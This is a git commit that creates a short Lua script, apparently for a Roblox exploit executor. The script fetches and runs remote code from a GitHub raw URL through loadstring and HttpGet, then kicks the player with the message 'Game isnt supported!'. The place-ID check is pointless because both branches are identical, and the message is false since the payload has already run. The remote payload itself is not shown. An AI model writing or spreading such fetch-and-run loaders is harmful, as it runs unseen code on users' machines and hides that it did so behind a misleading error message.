40089c1465895f6cd7cc841caa693d00207cb705
KidtoxicBtw <134671326+KidtoxicBtw@users.noreply.github.com>
2024-01-13 02:28:11 -0600

    Create no.lua

---
+++ no.lua
@@ -0,0 +1,13 @@
+--dont use
+local id = game.PlaceId
+local plyr = game.Players.LocalPlayer
+
+if id == 13772394625 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KidtoxicBtw/Games/main/dontuselplspls.lua")()
+    task.wait(1)
+    plyr:Kick("Game isnt supported!")
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KidtoxicBtw/Games/main/dontuselplspls.lua")()
+    task.wait(1)
+    plyr:Kick("Game isnt supported!")
+end
